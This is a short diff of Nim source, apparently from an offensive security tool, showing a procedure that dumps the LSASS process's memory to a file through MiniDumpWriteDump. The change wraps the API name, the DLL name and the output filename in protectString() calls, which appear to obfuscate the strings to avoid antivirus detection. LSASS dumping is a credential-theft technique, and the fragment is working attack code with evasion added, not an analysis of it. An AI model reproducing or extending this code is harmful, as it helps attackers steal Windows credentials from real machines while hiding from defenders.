@@ -11,7 +11,7 @@ proc MiniDumpWriteDump(
     ExceptionParam: PMINIDUMP_EXCEPTION_INFORMATION, 
     UserStreamParam: PMINIDUMP_USER_STREAM_INFORMATION,
     CallbackParam: PMINIDUMP_CALLBACK_INFORMATION    
-): BOOL {.importc: "MiniDumpWriteDump", dynlib: "dbghelp", stdcall.}
+): BOOL {.importc: protectString("MiniDumpWriteDump"), dynlib: protectString("dbghelp"), stdcall.}
 
 
 proc dump_lsass_minidumpwritedump*(): bool =
@@ -26,7 +26,7 @@ proc dump_lsass_minidumpwritedump*(): bool =
     if not bool(process_handle):
         return is_success
     try:
-        var f = open("l.d", fmWrite)
+        var f = open(protectString("l.d"), fmWrite)
         var success = MiniDumpWriteDump(
             process_handle,
             cast[DWORD](pid),
